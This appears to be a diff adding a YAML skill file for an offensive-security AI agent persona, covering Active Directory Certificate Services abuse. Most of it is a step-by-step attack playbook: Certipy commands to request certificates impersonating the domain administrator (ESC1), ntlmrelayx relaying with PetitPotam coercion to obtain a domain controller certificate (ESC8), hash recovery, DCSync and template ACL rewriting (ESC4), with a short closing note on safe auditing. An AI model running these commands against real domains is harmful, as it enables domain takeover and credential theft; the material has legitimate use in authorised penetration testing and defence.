@@ -1,0 +1,64 @@
+schema_version: 1
+version: 3.0.0
+name: adcs-certificate-abuse
+description: Senior Active Directory Certificate Services (ADCS) assessment — certificate template misconfigurations (ESC1 to ESC13), Certipy enumeration, Web Enrollment NTLM relaying (ESC8), and PKINIT ticket forging.
+triggers:
+  - adcs
+  - certipy
+  - esc1
+  - esc2
+  - esc3
+  - esc4
+  - esc8
+  - pki
+  - certificate template
+  - pkinit
+  - shadow credentials
+tools:
+  - certipy
+  - nmap
+knowledge: |
+  Audit Active Directory Certificate Services (ADCS) and PKI architectures with senior offensive domain engineering rigor.
+
+  1. ADCS PKI DISCOVERY & TEMPLATE ENUMERATION:
+     - Identify Active Directory Certificate Authorities (CAs) and published certificate templates:
+       `certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -stdout`
+     - Parse discovered templates for privilege escalation flags (ESC1, ESC2, ESC3, ESC4, ESC8):
+       • `Enrollee Supplies Subject`: Allows requester to specify an arbitrary Subject Alternative Name (SAN).
+       • `Client Authentication`: Extended Key Usage (EKU) permitting Kerberos authentication.
+       • `Manager Approval`: When Disabled, certificates are issued immediately without administrative sign-off.
+       • `Authorized Signatures Required`: When 0, requires no co-signatures.
+
+  2. ESC1 VULNERABLE TEMPLATE EXPLOITATION:
+     - Template Requirements:
+       `EnrolleeSuppliesSubject = True` + `Client Authentication EKU` + unprivileged enrollment rights.
+     - Request Certificate with Arbitrary Domain Admin SAN:
+       `certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template <vulnerable_template> -upn administrator@<domain> -out admin.pfx`
+     - Authenticate via PKINIT to Request Admin TGT and NTLM Hash:
+       `certipy auth -pfx admin.pfx -dc-ip <dc_ip>`
+       Recovers the Domain Administrator's NTLM hash and saves the Kerberos TGT (`admin.ccache`).
+
+  3. ESC8 WEB ENROLLMENT NTLM RELAYING:
+     - Target Vulnerability:
+       ADCS Web Enrollment HTTP endpoints (`http://<ca_server>/certsrv/`) supporting NTLM authentication without EPA (Extended Protection for Authentication) and without enforcing HTTPS.
+     - Attack Workflow:
+       1. Set up Responder and NTLM relay targeting the ADCS HTTP enrollment endpoint:
+          `ntlmrelayx.py -t http://<ca_server>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`
+       2. Force incoming machine or administrative authentication (via PetitPotam, PrinterBug, or LLMNR/NBT-NS).
+       3. `ntlmrelayx` relays the relayed session to the CA, generating a machine certificate for the domain controller.
+       4. Use the issued certificate with `certipy auth` to retrieve the DC's machine account hash and perform DCSync.
+
+  4. ESC4 TEMPLATE ACL MISCONFIGURATION & WRITE PRIVILEGES:
+     - When an unprivileged domain user has write permissions (`GenericAll`, `WriteDacl`, or `WriteOwner`) over a certificate template:
+       1. Overwrite template configuration: Set `EnrolleeSuppliesSubject = True` and add `Client Authentication` EKU.
+       2. Execute ESC1 certificate request as described in step 2.
+       3. Revert template ACLs and configuration to clean up artifacts.
+
+  5. SAFE AUDITING STANDARDS:
+     - Prioritize non-intrusive enumeration (`certipy find -stdout`) to catalog vulnerable templates without requesting certificates.
+     - Never issue administrative certificates in production AD forests without explicit operator approval.
+references:
+  - persona:adcs-certificate-abuse-v3
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/adcs-certificate-abuse.yaml
